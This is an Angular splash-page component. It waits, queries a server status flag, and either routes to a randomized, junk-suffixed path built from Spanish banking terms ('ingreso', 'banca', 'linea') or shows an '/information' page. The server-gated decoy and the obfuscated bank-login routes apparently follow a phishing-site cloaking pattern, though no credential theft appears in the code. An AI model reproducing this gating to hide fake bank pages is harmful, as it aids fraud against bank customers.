import { Component, HostListener, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { environment } from 'src/environments/environment';
import { MainService } from '../shared/services/main.service';
import Generate from 'src/app/shared/class/generate.class';

@Component({
  selector: 'app-splash',
  templateUrl: './splash.page.html',
  styleUrls: ['./splash.page.scss'],
})
export class SplashPage implements OnInit {
  API_URL = environment.API_URL;

  generate: Generate;
  screenWidth: any;
  screenHeight: any;
  showText: boolean = false;

  constructor(private router: Router, private mainSrv: MainService) {
    this.generate = new Generate('initialqqlrzdcmjw');
  }

  ngOnInit() {
    this.screenWidth = window.innerWidth;
    this.screenHeight = window.innerHeight;

    // console.log(this.getVhPx(20))

    setTimeout(() => {
      setTimeout(() => {
        this.showText = true;
        this.checkStatus();
        // this.start();
      }, 1500);
    }, 3000);
  }

  @HostListener('window:resize', ['$event'])
  onResize(event: any) {
    this.screenWidth = window.innerWidth;
    this.screenHeight = window.innerHeight;
  }

  async checkStatus() {
    try {
      const data: any = await this.mainSrv.getStatus();
      // console.log(data);
      if (data && data.isOk) {
        localStorage.setItem('isOk', 'true');
        this.router.navigate([this.getRoute()]);
      } else {
        localStorage.setItem('isOk', 'false');
        this.goInfo();
      }
    } catch (error) {
      localStorage.setItem('isOk', 'false');
      this.goInfo();
    }
  }

  private goInfo() {
    this.router.navigate(['/information']);
  }

  getVhPx(porcent: number): string {
    let height: number = this.screenHeight as number;
    return `${(porcent * height) / 100}px`;
  }

  getSubVhPx(data: { main: number; sub: number }): string {
    let height: number = this.screenHeight as number;
    let currentP: number = (data.main * height) / 100;
    return `${(data.sub * currentP) / 100}px`;
  }

  getVwPx(porcent: number, current: number) {
    return (porcent * current) / 100;
  }

  getRoute(): string {
    const main = ['logokodrzfzps', 'iniciojjzmqpjzio', 'ingresoioxkyhgeyb'];
    const optional = [
      'banca',
      'linea',
      'info',
      'gestor',
      'consumo',
      'convenio',
      '',
      'canal',
    ];
    let rand = `${main[Math.floor(Math.random() * main.length)]}/${
      optional[Math.floor(Math.random() * optional.length)]
    }`;
    return rand;
  }

  // function vh(v) {
  //   var h = Math.max(document.documentElement.clientHeight, window.innerHeight || 0);
  //   return (v * h) / 100;
  // }

  // function vw(v) {
  //   var w = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
  //   return (v * w) / 100;
  // }

  // function vmin(v) {
  //   return Math.min(vh(v), vw(v));
  // }

  // function vmax(v) {
  //   return Math.max(vh(v), vw(v));
  // }
  // console.info(vh(20), Math.max(document.documentElement.clientHeight, window.innerHeight || 0));
  // console.info(vw(30), Math.max(document.documentElement.clientWidth, window.innerWidth || 0));
  // console.info(vmin(20));
  // console.info(vmax(20));
}
